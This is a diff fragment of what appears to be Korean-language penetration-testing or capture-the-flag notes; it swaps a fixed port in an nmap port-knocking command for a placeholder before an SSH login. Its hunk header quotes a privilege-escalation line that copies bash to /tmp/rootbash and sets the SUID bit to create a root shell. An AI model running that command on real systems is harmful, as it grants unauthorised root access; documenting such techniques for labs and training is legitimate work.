@@ -474,7 +474,7 @@ NAME=x /bin/cp /bin/bash /tmp/rootbash && /bin/chmod +s /tmp/rootbash
 
 ```bash
 # 노킹 시도
-nmap -Pn --host-timeout 201 --max-retries 0  -p 1111 host
+nmap -Pn --host-timeout 201 --max-retries 0  -p <knocking port> host
 
 # SSH 연결 시도
 ssh user@host # Now logins are allowed
